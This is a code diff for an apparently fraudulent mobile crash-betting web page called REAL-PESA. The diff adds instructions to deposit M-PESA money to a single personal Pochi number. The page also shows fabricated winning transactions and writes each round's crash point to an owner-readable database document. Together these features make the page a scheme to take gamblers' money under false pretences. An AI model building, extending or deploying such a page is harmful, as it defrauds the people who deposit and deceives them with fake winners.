@@ -28,6 +28,8 @@ input{width:90%;padding:15px;margin-bottom:15px;border-radius:12px;border:1px so
 .tx-item{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #222;font-size:0.85rem;}
 .win-c{color:var(--m);font-weight:bold;}
 .footer-box{background:#0a0a0a;padding:20px;border-top:1px solid #222;margin-top:20px;}
+.dep-steps{text-align:left;font-size:0.8rem;color:#aaa;margin-bottom:15px;background:#111;padding:10px;border-radius:10px;}
+.dep-steps b{color:#fff;display:block;margin-bottom:5px;}
 </style></head><body>
 <header id="adminTrigger"><div class="logo">REAL-PESA</div></header>
 <div class="how-to"><b>HOW TO PLAY:</b> 1. Enter Bet. 2. Tap PLACE BET. 3. CASH OUT before crash to win!</div>
@@ -43,6 +45,7 @@ input{width:90%;padding:15px;margin-bottom:15px;border-radius:12px;border:1px so
         <button class="wd-btn" onclick="withdraw()">WITHDRAW</button>
     </div>
 </div>
+
 <div class="tx-list">
     <span class="tx-header">Recent Transactions</span>
     <div id="tx-data">
@@ -50,9 +53,18 @@ input{width:90%;padding:15px;margin-bottom:15px;border-radius:12px;border:1px so
         <div class="tx-item"><span>Fatuma - Won Round</span><span class="win-c">KES 4500</span></div>
     </div>
 </div>
+
 <div class="footer-box">
+    <div class="dep-steps">
+        <b>HOW TO DEPOSIT:</b>
+        1. Go to M-PESA > Lipa na M-PESA<br>
+        2. Select Pochi la Biashara<br>
+        3. Enter Number: 0797097831<br>
+        4. Send money and wait for auto-reflection.
+    </div>
     <div style="color:var(--m);font-weight:bold;">OFFICIAL POCHI: 0797097831</div>
 </div>
+
 <script>
 // !!! PUT YOUR ACTUAL FIREBASE KEYS HERE !!!
 const firebaseConfig = { apiKey: "YOUR_KEY", projectId: "YOUR_ID", appId: "YOUR_APP" };
@@ -72,10 +84,7 @@ window.onload = () => {
 function loop(){ 
     isFlying=true; m=1.0; x.style.color="#fff"; s.innerText="FLYING...";
     let crash=(Math.random()*5+1.2).toFixed(2);
-    
-    // SEND SIGNAL TO OWNER PANEL
     db.collection("game_settings").doc("current_round").set({ next_crash: crash });
-
     iv=setInterval(()=>{
         m+=0.01; x.innerText=m.toFixed(2)+"x";
         if(m>=crash){
